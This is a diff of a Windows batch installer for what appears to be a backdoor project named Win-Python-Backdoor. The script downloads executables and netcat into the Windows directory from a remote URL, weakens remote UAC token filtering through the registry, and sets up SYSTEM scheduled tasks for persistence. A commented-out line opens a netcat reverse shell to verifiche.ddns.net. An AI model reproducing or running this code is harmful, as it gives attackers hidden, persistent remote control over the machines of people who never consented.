@@ -43,14 +43,16 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
 taskkill /f /im woffice.exe
-wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
+
 wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
 wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
 wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
 wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
 wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
 wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
+schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
 SLEEP 10
 taskkill /f /im wup.exe
@@ -63,7 +65,8 @@ schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Def
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
-schtasks /create /tn office_get /xml %windir%\office_get.xml /F
+rem schtasks /delete /tn syskill /F
+
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\get.bat" /tn office_get /rl highest /F
